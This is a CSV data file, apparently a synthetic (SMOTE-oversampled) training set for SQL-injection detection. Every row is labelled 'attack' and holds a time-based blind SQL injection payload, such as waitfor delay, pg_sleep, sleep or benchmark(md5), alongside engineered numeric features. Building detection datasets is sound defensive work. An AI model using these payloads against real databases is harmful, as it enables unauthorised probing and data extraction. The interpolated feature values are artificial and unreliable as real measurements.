id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000185,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000066,0.40315832510229754,52.08245300034767,20.576462249971026,3.669345381523389,23.0,3.0,16.23537750028973,9.847075500057946,0.44720648431013466,0.05833128056219147,0.3051111815757105,0.18935105355196336,5.0,0.0,0.0,0.0,0.0,1.0,0.0,1.847075500057946,0.0,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000186,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",nearest_attack_euclidean,R000222,0.6775942058204065,76.40668257270599,24.881336514541196,3.5535118223090825,21.705069211632956,11.410138423265915,31.586405726174153,11.705069211632956,0.2856850872294885,0.14711671545648425,0.4140923160228178,0.1531058812912095,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.352534605816478,0.0,0.0,1.0,2.3525346058164787,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.17626730290823928,0.0,0.17626730290823933,0.0,0.8237326970917607,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.176267302908239
SMOTE_000187,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000045,0.7710012235463417,56.93471658147516,18.471582064388436,3.3596987138942143,27.292626903417343,1.2357910321942178,20.877880710252036,7.528417935611563,0.4820516134481334,0.022770477074531184,0.3631823976032601,0.13199551187407535,3.2357910321942183,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,3.5284179356115635,0.0,0.7642089678057817,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.7642089678057817,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.23579103219421838,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000188,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000057,0.06326727592276438,47.97678466535422,22.023215334645787,4.0684189390853005,26.90713866141685,3.0,10.046430669291574,8.023215334645787,0.5608020699394703,0.062530871455646,0.20942412476615846,0.1672429338387252,2.0,3.0,0.0,0.0,0.0,0.023215334645787178,0.0,1.0,0.0,0.0,-5.551115123125783e-17,0.02321533464578729,1.0,1.0,0.0,0.0,0.0,0.02321533464578729,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000189,attack,time,"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000221,0.5561136581615296,86.0,25.0,3.5285687866542257,21.0,18.0,36.0,11.0,0.2441860465116279,0.20930232558139536,0.4186046511627907,0.12790697674418605,0.8306216405716617,0.1693783594283383,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.8306216405716617,0.16937835942833834,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000190,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.25566702621277315,36.792950657953114,16.088105628661456,3.270005777642317,13.0,0.0,13.616739400630198,10.176211257322914,0.3547479268188948,0.0,0.3684532468328992,0.2767988263482061,0.0,0.08810562866145688,2.0,0.0,0.0,1.1102230246251565e-16,0.0,3.0881056286614568,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.08810562866145696,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000191,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000099,0.2434926696814964,64.35834352415694,21.0,3.367112806450092,21.0,10.0,26.59286587784881,6.765477646308135,0.3270351273735758,0.15573101303503611,0.41219710561418255,0.10503675397720552,0.0,0.0,2.0,0.0,0.0,1.0,0.0,3.7654776463081348,0.0,0.0,-5.551115123125783e-17,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000192,attack,time,"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""vxec"" like ""vxec",nearest_attack_euclidean,R000100,0.0637783945172397,99.87552051587909,28.96443443310831,3.8562113614944082,30.088913917229227,21.87552051587908,35.94665164966246,11.964434433108309,0.30135761034909136,0.21895597852027618,0.3599082178918924,0.11977819323873999,0.0,3.982217216554155,0.0,0.0,0.0,0.9822172165541547,0.0,6.0,0.0,0.0,1.0,0.9822172165541546,0.0,1.0,0.0,0.0,0.0,0.9822172165541547,1.0,0.0,0.0,1.0,0.0,0.017782783445845274,0.0,0.0,0.0,1.9822172165541545,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000193,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000066,1.1766890606273304,54.43023281706735,21.43023281706735,3.7524058816456334,24.720931268269396,3.0,17.139534365865302,9.569767182932651,0.4538838160585853,0.055120976952457226,0.31508103200320337,0.1759141749857541,5.0,0.0,0.0,0.0,0.0,0.5697671829326507,0.0,2.0,0.0,0.0,-5.551115123125783e-17,0.5697671829326505,1.0,0.0,0.0,0.0,0.0,0.5697671829326507,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000194,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   #",nearest_attack_euclidean,R000271,0.12763535922397737,60.0,25.0,3.8262123297731505,19.563616225838032,15.436383774161968,19.0,6.0,0.32606027043063385,0.25727306290269947,0.31666666666666665,0.1,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000195,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R000244,4.386073898601576,171.12351900717488,31.237588147391445,3.531551672082219,54.47517629478289,25.71276444217434,72.31678419652192,18.618794073695724,0.3187167910836544,0.1459987848028675,0.42595554760840254,0.10932887650507558,1.0,0.0,0.0,0.4604019754347591,0.539598024565241,1.0,0.0,13.079196049130482,0.0,0.460401975434759,1.539598024565241,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.539598024565241,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.539598024565241,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.539598024565241
SMOTE_000196,attack,time,1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000139,0.616619952697143,104.83553313636133,30.0,3.896004496620718,34.0,18.0,38.0,14.835533136361338,0.3243216001248823,0.17169967065434943,0.3624770824925155,0.14150164672825277,3.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,-5.551115123125783e-17,5.835533136361338,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.8355331363613387,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000197,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R000213,0.11949568832528411,140.6120707446937,30.935345124115617,3.640269634631231,52.90301768617342,10.0,57.80603537234684,19.903017686173424,0.3762650912244591,0.07113526266166711,0.4110809216729161,0.14151872444095767,3.9676725620578077,0.0,0.0,0.0,1.0,1.0,0.0,9.967672562057807,0.0,0.0,-5.551115123125783e-17,5.935345124115615,1.0,0.0,0.0,0.03232743794219217,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,1.0,3.0,0.0,1.0,2.0,0.0,0.03232743794219223,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.032327437942192
SMOTE_000198,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000053,1.5855751677906387,80.3317992855737,24.44393309519123,3.618051931827366,27.49884946418027,10.0,31.832949821393424,11.0,0.3400671114589103,0.12517034764613424,0.39707515848420777,0.13768738241074768,0.0,4.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.6109832737978078,0.3890167262021922,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.6109832737978078,0.0,0.0,0.6109832737978078,1.9999999999999996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3890167262021922,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6109832737978076
SMOTE_000199,attack,time,"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",nearest_attack_euclidean,R000249,0.1335270423887222,54.6474279641679,22.741028814332836,3.773678221446934,23.0,3.0,18.517942371334325,10.129485592833582,0.4212520893986623,0.05494592470417334,0.3384542324849439,0.18534775341222043,2.0,3.0,0.0,0.0,0.0,1.0,0.0,2.129485592833581,0.0,0.0,-5.551115123125783e-17,0.9999999999999999,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000200,attack,time,1%'  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000225,1.213522014402127,30.627407296461598,20.0,4.047999481725523,12.000000000000002,4.0,5.90192583716928,8.72548145929232,0.39406378754914445,0.13135459584971482,0.18920112929882607,0.28538048730231463,2.7254814592923196,0.27451854070768034,2.0,0.0,0.0,1.1102230246251565e-16,0.0,0.7254814592923196,1.0,0.0,-5.551115123125783e-17,2.0,1.0,0.27451854070768034,1.0,0.0,0.0,0.0,0.7254814592923197,0.0,0.0,2.7755575615628914e-17,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
